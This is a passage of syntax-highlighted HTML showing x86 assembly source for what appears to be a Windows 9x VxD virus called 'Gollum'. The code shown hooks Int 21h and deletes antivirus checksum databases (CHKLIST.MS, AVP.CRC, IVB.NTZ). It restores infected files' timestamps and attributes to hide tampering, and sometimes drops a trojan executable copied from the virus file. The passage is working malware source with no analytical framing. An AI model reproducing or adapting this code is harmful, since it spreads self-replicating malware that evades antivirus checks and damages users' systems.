    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">CheckSum_File_01</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delete_File</span><span class="sc0">
    </span><span class="sc1">;Delete CHKLIST.MS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">CheckSum_File_02</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delete_File</span><span class="sc0">
    </span><span class="sc1">;Delete AVP.CRC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">CheckSum_File_03</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delete_File</span><span class="sc0">
    </span><span class="sc1">;Delete IVB.NTZ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">CheckSum_File_04</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delete_File</span><span class="sc0">
</span><span class="sc5">Restore_Date_Time</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Time</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Date</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Infect_Close</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc1">;Close file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Restore_Attr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Restore file attr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Attr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Infect_FileName</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Infect_Error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit_VxD_Int_21h</span><span class="sc0">

</span><span class="sc1">;Drop a trojan .EXE file (sometimes)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">Drop_Exe_Trojan</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;This is our dice</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Bad_OverWrite</span><span class="sc0">
    </span><span class="sc1">;Open Gollum VxD file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">VxD_File_Name</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Bad_OverWrite</span><span class="sc0">
    </span><span class="sc1">;Save file handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Gollum_Handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc1">;Create file, abort if exist</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Trojan_File_Name</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Bad_OverOpen</span><span class="sc0">
    </span><span class="sc1">;Save file handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Victim_Handle</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Trojanize_Block</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Read VxD file block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Gollum_Handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">VxD_Buffer</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc1">;Write block        </span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Victim_Handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">        
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Trojanize_Block</span><span class="sc0">
    </span><span class="sc1">;Close trojan file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Bad_OverOpen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;Close virus VxD file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Gollum_Handle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Bad_OverWrite</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exit_VxD_Int_21h</span><span class="sc0">

</span><span class="sc1">;Delete file routines</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">Delete_File</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Start_FileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Copy_DB_Name</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Copy_DB_Name</span><span class="sc0">
    </span><span class="sc1">;Wipe out file attr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OFFSET32</span><span class="sc0"> </span><span class="sc5">Infect_FileName</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc1">;Delete filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Move file pointer routines (bx = file handle)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span><span class="sc5">Seek_File_Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">Seek_Int_21h</span><span class="sc0">
</span><span class="sc5">Seek_File_End</span><span class="sc4">:</span><span class="sc0">        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">Seek_Int_21h</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc5">VxDint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Seek_Error</span><span class="sc0">
    </span><span class="sc1">;Return file pointer position into eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000FFFFh</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">File_Size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Seek_Error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">VxD_Int_21h</span><span class="sc0">

</span><span class="sc5">VxD_LOCKED_CODE_ENDS</span><span class="sc0">

    </span><span class="sc5">END</span></div></body>
</html>
